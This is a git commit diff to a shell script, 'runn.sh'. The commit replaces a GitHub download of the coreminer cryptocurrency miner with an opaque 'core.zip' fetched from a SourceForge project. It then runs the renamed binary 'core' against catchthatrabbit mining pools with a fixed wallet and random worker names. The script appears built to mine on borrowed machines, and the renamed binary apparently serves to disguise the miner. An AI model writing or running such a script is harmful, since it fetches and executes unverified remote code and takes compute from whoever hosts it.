e4cdd5f1f78849266e2f598b99118358554e489c
micolaseros-web <micolaseros@gmail.com>
2026-03-12 18:00:32 -0700

    Update runn.sh

--- runn.sh
+++ runn.sh
@@ -1,6 +1,6 @@
 uname -a
 export LC_ALL=C; unset LANGUAGE
-curl https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz -L -o coreminer-linux-x86_64.tar.gz
-tar xf coreminer-linux-x86_64.tar.gz
+curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip
+unzip core.zip
 ls
-./coreapp/coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
+./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
